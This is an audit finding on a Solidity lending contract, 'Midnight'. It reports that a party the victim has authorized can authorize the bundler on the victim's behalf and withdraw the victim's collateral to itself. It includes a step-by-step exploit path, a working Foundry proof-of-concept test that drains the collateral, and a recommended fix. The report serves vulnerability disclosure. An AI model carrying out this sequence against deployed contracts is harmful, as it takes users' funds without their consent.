### Title
Authorized-party can escalate to grant bundler full control over victim's position — (`src/Midnight.sol`)

### Summary

`Midnight.setIsAuthorized` permits any already-authorized party to grant *further* authorizations on behalf of the authorizer. An attacker who holds `isAuthorized[victim][attacker] = true` can call `setIsAuthorized(bundler, true, victim)` to authorize `MidnightBundles` on victim's behalf, then invoke bundler functions with `taker=victim` to perform arbitrary market operations — including withdrawing victim's collateral to an attacker-controlled address — without any additional consent from the victim.

### Finding Description

**Root cause — `Midnight.setIsAuthorized` (src/Midnight.sol:731-735):**

```solidity
function setIsAuthorized(address authorized, bool newIsAuthorized, address onBehalf) external {
    require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
    isAuthorized[onBehalf][authorized] = newIsAuthorized;
    ...
}
```

The guard at line 732 allows *any* address that `onBehalf` has previously authorized to call this function and grant *new* authorizations on `onBehalf`'s behalf. There is no restriction that only the account itself (`onBehalf == msg.sender`) may issue new authorizations. This is confirmed as intentional by the existing test `testSetIsAuthorizedAuthorization` (test/AuthorizationTest.sol:290-304), which explicitly asserts that an authorized party can set new authorizations. [1](#0-0) 

**Exploit path:**

**Step 1 — Precondition (legitimate):** Victim authorizes attacker for some purpose:
```
midnight.setIsAuthorized(attacker, true, victim)  // called by victim
→ isAuthorized[victim][attacker] = true
```

**Step 2 — Escalation:** Attacker calls `setIsAuthorized` to authorize the bundler on victim's behalf:
```
midnight.setIsAuthorized(address(midnightBundles), true, victim)  // called by attacker
```
Check at line 732: `isAuthorized[victim][attacker]` = true → passes.
Result: `isAuthorized[victim][midnightBundles] = true`. [2](#0-1) 

**Step 3 — Bundler entry:** Attacker calls `buyWithUnitsTargetAndWithdrawCollateral(..., taker=victim, collateralReceiver=attacker, ...)`:

```solidity
require(taker == msg.sender || IMidnight(MIDNIGHT).isAuthorized(taker, msg.sender), Unauthorized());
```
Check: `isAuthorized[victim][attacker]` = true → passes. [3](#0-2) 

**Step 4 — Midnight.take called by bundler with taker=victim:**

```solidity
require(taker == msg.sender || isAuthorized[taker][msg.sender], TakerUnauthorized());
```
Here `msg.sender` = `midnightBundles`. Check: `isAuthorized[victim][midnightBundles]` = true (set in Step 2) → passes. [4](#0-3) 

**Step 5 — Collateral withdrawal to attacker:** The bundler then calls `withdrawCollateral` with `onBehalf=victim` and `collateralReceiver=attacker` (attacker-controlled parameter):

```solidity
IMidnight(MIDNIGHT).withdrawCollateral(
    market, collateralWithdrawals[i].collateralIndex,
    collateralWithdrawals[i].assets, taker, collateralReceiver
);
```
`withdrawCollateral` checks `isAuthorized[victim][midnightBundles]` = true → passes. Victim's collateral is sent to attacker. [5](#0-4) 

### Impact Explanation

An attacker holding any authorization from victim can:
1. Force victim into arbitrary debt positions (take sell offers on victim's behalf).
2. Withdraw victim's collateral to an attacker-controlled `collateralReceiver`.
3. Combine both: take a large debt position for victim then drain victim's collateral, leaving victim insolvent.

This directly violates the invariant that "collateral cannot be withdrawn or seized outside health/liquidation rules" and that "authorization must require explicit user consent for each authorized address."

### Likelihood Explanation

**Preconditions:**
- Victim must have authorized attacker for *any* reason (e.g., to use a legitimate bundler function, to allow a third-party operator, etc.). This is a normal and expected user action.
- No admin access, no oracle manipulation, no leaked keys required.
- Repeatable: attacker can re-authorize the bundler any time victim re-authorizes attacker.

The scenario is realistic because users routinely authorize operators (e.g., bots, aggregators) for convenience, without expecting that authorization to be transitive.

### Recommendation

Restrict `setIsAuthorized` so that only the account itself can grant new authorizations — remove the `isAuthorized[onBehalf][msg.sender]` branch from the guard:

```solidity
function setIsAuthorized(address authorized, bool newIsAuthorized, address onBehalf) external {
    require(onBehalf == msg.sender, Unauthorized()); // only self can grant new authorizations
    isAuthorized[onBehalf][authorized] = newIsAuthorized;
    emit EventsLib.SetIsAuthorized(msg.sender, authorized, newIsAuthorized, onBehalf);
}
```

If delegation of authorization-granting is intentionally desired, introduce a separate, explicitly scoped permission (e.g., a `canDelegate` flag) so users can opt in to transitive authorization with full awareness.

### Proof of Concept

```solidity
// Foundry unit test
function testAuthorizationEscalationViaAuthorizedParty() public {
    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");
    address bundler = address(midnightBundles);

    // Setup: victim has collateral
    uint256 collateralAmount = 1000e18;
    deal(address(collateralToken1), victim, collateralAmount);
    vm.prank(victim);
    collateralToken1.approve(address(midnight), collateralAmount);
    vm.prank(victim);
    midnight.supplyCollateral(market, 0, collateralAmount, victim);

    // Step 1: victim authorizes attacker (legitimate action)
    vm.prank(victim);
    midnight.setIsAuthorized(attacker, true, victim);

    // Step 2: attacker escalates — authorizes bundler on victim's behalf
    vm.prank(attacker);
    midnight.setIsAuthorized(bundler, true, victim);
    assertTrue(midnight.isAuthorized(victim, bundler)); // bundler now authorized

    // Step 3: attacker calls bundler with taker=victim, collateralReceiver=attacker
    CollateralWithdrawal[] memory withdrawals = new CollateralWithdrawal[](1);
    withdrawals[0] = CollateralWithdrawal({collateralIndex: 0, assets: collateralAmount});

    vm.prank(attacker);
    midnightBundles.buyWithUnitsTargetAndWithdrawCollateral(
        0,                    // targetUnits = 0 (skip takes)
        0,                    // maxBuyerAssets
        victim,               // taker = victim
        _noPermit(),
        new Take[](0),        // no takes needed
        withdrawals,
        attacker,             // collateralReceiver = attacker
        0,
        address(0)
    );

    // Assert: victim's collateral drained to attacker without victim's consent
    assertEq(collateralToken1.balanceOf(attacker), collateralAmount);
    assertEq(midnight.collateralOf(toId(market), victim, 0), 0);
}
```

Expected assertions pass: victim's collateral balance in Midnight drops to zero; attacker's wallet receives the full collateral amount. Victim never consented to the bundler authorization or the withdrawal.

### Citations

**File:** src/Midnight.sol (L346-346)
```text
        require(taker == msg.sender || isAuthorized[taker][msg.sender], TakerUnauthorized());
```

**File:** src/Midnight.sol (L731-735)
```text
    function setIsAuthorized(address authorized, bool newIsAuthorized, address onBehalf) external {
        require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
        isAuthorized[onBehalf][authorized] = newIsAuthorized;
        emit EventsLib.SetIsAuthorized(msg.sender, authorized, newIsAuthorized, onBehalf);
    }
```

**File:** src/periphery/MidnightBundles.sol (L60-61)
```text
        require(taker == msg.sender || IMidnight(MIDNIGHT).isAuthorized(taker, msg.sender), Unauthorized());
        require(referralFeePct < WAD, PctExceeded());
```

**File:** src/periphery/MidnightBundles.sol (L91-100)
```text
        for (uint256 i; i < collateralWithdrawals.length; i++) {
            IMidnight(MIDNIGHT)
                .withdrawCollateral(
                    market,
                    collateralWithdrawals[i].collateralIndex,
                    collateralWithdrawals[i].assets,
                    taker,
                    collateralReceiver
                );
        }
```
